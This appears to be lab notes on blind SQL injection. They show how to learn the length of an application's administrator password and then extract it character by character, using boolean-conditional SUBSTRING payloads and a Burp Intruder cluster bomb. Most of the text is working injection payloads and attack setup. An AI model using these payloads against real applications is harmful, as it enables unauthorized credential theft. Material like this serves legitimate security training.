### Blind SQL Injection for Password Enumeration (Cluster Bomb Method)

#### **Objective**

Extract the `administrator` password using blind SQL injection. The app responds with "Welcome back" for `true` conditions and no message for `false`.

---

### **Methodology**

1. **Determine Password Length**:
    
    - Use a binary narrowing approach:
        
        ```sql
        ' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') < 30 --;
        ```
        
    - Gradually decrease the value until it evaluates to `false`. Confirm with:
        
        ```sql
        ' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 20 --;
        ```
        
    - **Result**: Password is **20 characters long**.
2. **Enumerate Characters**:
    
    - Use `SUBSTRING` to test each position:
        
        ```sql
        ' AND (SELECT SUBSTRING(password, §{position}§, 1) FROM users WHERE username = 'administrator') = '§{character}§' --;
        ```
        
    - Test all positions (`1-20`) and characters (`0-9`, `a-z`) to find matches.
3. **Automate with Cluster Bomb**:
    
    - **Payload Set 1**: Password positions (`1-20`).
    - **Payload Set 2**: Potential characters (`0-9`, `a-z`).
    - Observe responses and look for "Welcome back" to identify correct guesses.

---

### **Key Payloads**

- **Check Length**:
    
    ```sql
    ' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 20 --;
    ```
    
- **Guess Characters**:
    
    ```sql
    ' AND (SELECT SUBSTRING(password, §{position}§, 1) FROM users WHERE username = 'administrator') = '§{character}§' --;
    ```
    

---

### **Cluster Bomb Strategy**

1. Place positional markers in the payload (`§position§` and `§character§`).
2. Configure Burp Intruder:
    - **Set 1**: Positions (`1-20`).
    - **Set 2**: Characters (`0-9`, `a-z`).
3. Run the attack and filter responses to identify successful guesses.

**Example Output**:

- Position `1`: `'a'`
- Position `2`: `'b'`
- Full password: `'abc123xyz...'`

---

This method ensures efficient and systematic password extraction with clear results.